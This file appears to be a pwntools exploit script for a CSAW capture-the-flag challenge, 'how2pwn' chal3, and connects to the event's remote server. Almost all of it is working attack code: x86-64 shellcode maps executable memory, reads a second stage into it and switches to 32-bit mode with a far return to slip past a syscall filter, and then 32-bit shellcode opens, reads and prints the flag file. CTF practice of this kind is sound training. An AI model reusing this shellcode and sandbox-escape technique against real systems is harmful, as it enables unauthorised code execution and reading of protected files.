#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./chal3')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('how2pwn.chal.csaw.io', 60003)
    libc = ELF('./libc.so.6')

ticket = '8e7bd9e37e38a85551d969e29b77e1ce'

#gdb.attach(p)

s(ticket)

context.arch = 'amd64'

retf = b'\xcb'

sh = (
'''
    xor rax, rax
    mov al, 0x9
    mov rdi, 0x23330000
    mov rsi, 0x4000
    mov rdx, 07
    mov r10, 0x21
    xor r8, r8
    xor r9, r9
    syscall
''' + # SYSCALL_mmap
'''
    xor rax, rax
    xor rdi, rdi
    mov rsi, 0x23330000
    mov rdx, 0x1000
    syscall
''' + # SYSCALL_read
'''
    mov eax, 0x23330000
    mov rbx, 0x2300000000
    xor rax, rbx
    push rax
''' # push IP & CS
)

p.sendlineafter(b'Enter your shellcode: \n', asm(sh) + retf)

context.arch = 'i386'
context.bits = '32'

sh = (
'''
    mov esp, 0x23331500
    mov eax, 0x5
    push 0x67
    push 0x616c662f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
''' + # SYSCALL_open
'''
    mov ebx, eax
    mov al, 0x3
    mov ecx, 0x23332000
    mov edx, 0x2000
    int 0x80
''' + # SYSCALL_read
'''
    xor eax, eax
    mov al, 0x4
    xor ebx, ebx
    mov bl, 0x1
    int 0x80
''' # SYSCALL_write
)

input('@')
p.sendline(asm(sh))

p.interactive()

